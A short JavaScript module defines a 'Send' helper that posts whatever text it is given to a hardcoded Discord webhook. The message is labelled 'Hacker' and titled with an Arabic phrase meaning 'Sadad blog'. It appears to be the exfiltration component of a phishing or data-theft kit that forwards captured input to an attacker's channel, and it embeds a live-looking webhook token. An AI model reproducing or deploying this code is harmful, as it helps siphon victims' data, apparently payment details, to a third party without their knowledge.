import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1332502827104206910/O-_L1YG25lVqZSv-wV1421sbYYKi_NEKOUKeoMVwnYVVfBo4Lhu500WDHHMOYeRMMLR2",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
